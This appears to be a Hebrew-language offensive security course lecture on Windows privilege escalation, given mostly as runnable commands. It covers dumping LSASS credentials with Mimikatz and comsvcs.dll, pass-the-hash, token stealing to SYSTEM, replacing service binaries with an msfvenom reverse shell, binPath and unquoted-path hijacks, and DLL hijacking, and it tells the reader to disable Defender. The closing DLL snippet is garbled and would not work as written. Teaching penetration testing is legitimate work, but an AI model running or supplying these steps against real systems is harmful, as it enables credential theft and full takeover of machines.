    3.2 - הסלמת הרשאות בווינדוס

    ב3 הרצאות הבאות נראה המון שיטות להסלים הרשאות בווינדוס, תעדו הכל, נסו בעצמכם ועקבו אחרי.

    גניבת סיסמאות והאשים מ-LSASS¶

    הprocess הLSASS (Local Security Authority Subsystem Service) הוא process בWindows ששומר בזיכרון מידע על כניסות משתמשים- כלומר, אם יש לנו גישה לקבל תמונה מהזכרון של הprocess (דאמפ)- נוכל לשלוף ממנו סיסמאות של משתמשים והאשים.

    שליפת סיסמאות עם Mimikatz¶

    הכלי Mimikatz מאפשר לנו לשלוף סיסמאות בטקסט גלוי מ-LSASS אם יש לנו הרשאות מתאימות.

    התקינו אותו:

    Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz.exe" -OutFile "mimikatz.exe"

    שימו לב, שהאנטיווירוס של ווינדוס- דפנדר קופץ על הכלי, אז כבו אותו. 

    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

    הפקודה sekurlsa::logonpasswords תציג את כל הסיסמאות וההאשים השמורים בזיכרון.

    הDump של Hashes מהמערכת¶

    אם אין לנו אפשרות להריץ Mimikatz ישירות, ניתן ליצור Dump של LSASS ולהוציא ממנו מידע מאוחר יותר:

    tasklist /fi "imagename eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump <PID> C:\lsass.dmp full

    ואז לנתח את ה-Dump עם Mimikatz:

    mimikatz.exe "sekurlsa::minidump C:\lsass.dmp" "sekurlsa::logonpasswords" exit

    מתקפת Pass-the-Hash (PTH)¶

    אם הצלחנו לגנוב את ה-NTLM hash של משתמש, ניתן להשתמש בו לאימות במקום הסיסמה.
    נרחיב בהמשך הקורס יותר על המתקפה, אבל כרגע תשמרו לכם מאחורי הראש, שבווינדוס אם מגנון האימתות המשומש הוא NTLM (שזו הסיטואציה ברוב המוחלט של המקרים) ברגע שיש לכם ntlm hash של סיסמא של משתמש, תוכלו להשתמש בה כדי להתחזות למשתמש.
    מוזמנים לחזור לקורס רשתות שבו הסברנו על nltm, איך הוא עובד ומדוע באמצעות הhash אנחנו יכולים לעשות כל מה שאנחנו רוצים.

    הבעיה היא שגם אחרי שניצור סשן כמשתמש אחר עם pth לא בדיוק יהיו לנו כל ההרשאות שלו.

    מה קורה כשאתה עושה PTH עם Mimikatz?¶

    כשאתה מבצע PTH, אתה בעצם משתמש ב-NTLM hash של המשתמש כדי לפתוח session בתורו. זה יוצר גישה חיצונית (network logon), ולא גישה אינטראקטיבית (interactive logon). בגלל זה, אם תעשה whoami אחרי PTH, ייתכן שעדיין תראה את המשתמש המקורי שלך ולא את המשתמש שהתחזית אליו.

    הבעיה היא שהסשן שנוצר דרך PTH לא יכיל טוקן מתאים להפעלת processes מקומיים עם הרשאות מוגברות. PTH בעיקר מאפשר לך לגשת למשאבי רשת (למשל, C$ או IPC$), אבל הוא לא מאפשר לך ליצור process מקומי עם טוקן של המשתמש שהתחזית אליו.

    כך שאם הגעתם לשליטה על process עם משתמש אחר, לא תמיד יהיה לכם טוקן מתאים כדי ליצור processes חדשים. ובשביל זה נרצה לחפש process עם טוקן חזק- ולהתעלק עליו. (כי לזה בדרך כלל יש לנו הרשאות)

    איך להשתמש בטוקן של משתמש גבוה אחרי PTH?¶

    אם הצלחת לבצע PTH למשתמש אדמיניסטרטור, אבל אתה עדיין לא SYSTEM, אתה יכול להשתמש ב-Token Impersonation כדי להסלים עוד שלב. הנה איך:

    1. הפעלת process חדש עם הרשאות גבוהות¶

    אם יש לך PTH למשתמש אדמין, אתה יכול להפעיל cmd.exe בתורו דרך Mimikatz:

    sekurlsa::pth /user:Administrator /domain:MYDOMAIN /ntlm:HASH /run:cmd.exe

    נהדר, דרך הפקודה למעלה השתמשנו בhash כדי לעשות pth בשביל ליצור process עם משתמש Administrator שיש לנו את הhash שלו.
    אבל עדיין נהיה מוגבלים!
    כדי לקבל שליטה מלאה מקומית (ולא רק ברשת), צריך לגנוב טוקן של process קיים.

    2. גניבת טוקן של process גבוה (Token Stealing)¶

    אם אתם כבר משתמש עם הרשאות גבוהות (כגון אדמין מקומי), תוכל להשתמש ב-Mimikatz כדי להתחזות (impersonate) לprocess אחר שרץ בתור SYSTEM:

    privilege::debug
token::elevate

    הפעולה תחפש בעצמה טוקנים של processes שאתם יכולים להתחזות אליהם, ותתחזה.

    תוכלו גם לראות טוקנים זמינים במערכת באמצעות

    mimikatz.exe "privilege::debug" "token::list"

    ואז ניתן לחפש process עם הרשאות גבוהות עם טוקן, הריצו token::steal בmimikatz לגנוב את הטוקן שלו.
    ```mimikatz
token::steal /pid:1234

    (כאשר 1234 הוא ה-PID של process שרץ תחת SYSTEM, כמו winlogon.exe או services.exe).

    3. הפעלת process חדש עם הרשאות SYSTEM¶

    לאחר שגנבתם את הטוקן של משתמש SYSTEM, תוכלו להריץ:

    process::create /cmd:"cmd.exe"

    וזה יפתח לכם cmd.exe עם הרשאות SYSTEM.

    מה זה שירותי Windows, ואיך ניתן לנצל אותם להעלאת הרשאות?¶

    שירותי Windows הם processes שרצים ברקע עם הרשאות שונות, לעיתים קרובות כ-SYSTEM. אם שירות מוגדר בצורה לא מאובטחת, ניתן לנצל זאת להשגת הרשאות גבוהות יותר.

    בדיקת שירותים פגיעים¶

    כדי לראות אילו שירותים רצים כ-SYSTEM, נשתמש בפקודה הבאה:

    wmic service get name,displayname,startmode | findstr "Auto"

    או נשתמש ב-PowerShell:

    Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.State -eq "Running" } | Select-Object DisplayName, Name, PathName

    אחת הדרכים להתעלק על שירותים, היא לחפש האם יש לנו הרשאות כתיבה ל שהpath של הקובץ הרצה ששירות מריץ.
    אם כן, נוכל להחליף את הקובץ בכלי שלנו, ואז לאתחל את השירות.
    הריצו:

    icacls "C:\Path\To\Service.exe"

    על קובץ הרצת השירות.

    אם יש לך הרשאות כתיבה על קובץ השירות (Service.exe), פשוט תחליף אותו בקובץ זדוני, לדוגמה, reverse shell.

    יצירת קובץ זדוני¶

    ניתן להשתמש ב-MSFVenom (כלי שיודע לג'נרט כלים של Metasploit) ליצירת reverse shell:

    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YourIP LPORT=4444 -f exe > evil.exe`

    ואז ניתן להפעיל את השירות מחדש:
    sc stop ServiceName
sc start ServiceName

    💥 השירות ירוץ כ-SYSTEM, וכתוצאה מכך גם הקובץ שהרצת!

    עוד דרך, היא שינוי של הנתיב עצמו שמכוון לקובץ הרצה של השירות.
    לפעמים אין לך הרשאות על הקובץ עצמו, אבל אתה יכול לשנות את ה-נתיב שלו.

    sc config ServiceName binPath= "C:\Path\To\evil.exe"

    ואז הפעל מחדש את השירות:
    sc stop ServiceName
sc start ServiceName

    Unquoted Service Path¶

    אם נתיב הקובץ של השירות אינו מוקף במרכאות (""), ניתן להכניס קובץ זדוני במסלול החיפוש של Windows.

    בדיקת שירותים עם נתיב לא מצוטט¶

    wmic service get name,displayname,pathname | findstr /i /v "C:\Windows"

    אם נמצא שירות עם נתיב כמו:

    C:\Program Files\Vulnerable Service\service.exe

    אז Windows תחפש קובץ service.exe בכל תיקיה בדרך (למשל, C:\Program.exe), ונוכל ליצור קובץ זדוני.

    הexploit Unquoted Service Path¶

    1. יוצרים קובץ הפעלה זדוני (malicious.exe):

    echo "evil code" > "C:\Program.exe"

    (כמובן שגם פה תוכלו לשים כל כלי שתבחרו, גם msfvenom.exe)
    2. מפעילים מחדש את השירות:

    net stop "Vulnerable Service" && net start "Vulnerable Service"

    השירות יריץ את הקובץ C:\Program.exe כ-SYSTEM.

    תקיפת DLL Hijacking בשירותי Windows¶

    קבצי exe הם קבצי הרצה בווינדוס, לרוב קבצי הרצה טוענים ספריות בזמן ריצת התוכנה, קבצי הספריות הדינמיות האלו נקראים קבצי DLL.
    אם יש לנו אפשרות להחדיר קובץ dll משלנו, כשתוכנה מסויימת תריץ אותה- נוכל לרוץ בהרשאות שלה, וכך יש פוטנציל בהסלמת הרשאות.
    שירותים רבים טוענים קבצי DLL מספריות שונות. אם השירות מחפש DLL שאינו קיים בספריות המערכת, ניתן להחדיר DLL זדוני שירוץ עם הרשאות השירות.

    בדיקת DLL Hijacking בשירותים¶

    1. מריצים את השירות בתוך Procmon של Sysinternals כדי לראות אילו DLL-ים הוא מחפש.
    2. אם נמצא DLL חסר בתיקיה שיש לנו גישה אליה, ניתן ליצור קובץ DLL זדוני באותו שם.

    יצירת DLL זדוני והחדרתו¶

    ב-PowerShell נוכל לכתוב סקריפט C# שיוצר DLL שמריץ cmd בmain function ואז לקמפל אותו לdll.

    $code = @"
using System;
using System.Runtime.InteropServices;
public class Test {
    public static void Entry() {
        System.Diagnostics.Process.Start("cmd.exe");
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[System.Reflection.Assembly]::Load($code).Entry()

    ושומרים את הקובץ כ- evil.dll ואז מניחים אותו בתיקיה השירות.

    בהרצאה הבאה אמשיך להציג עוד שיטות מעולות להסלמת הרשאות.
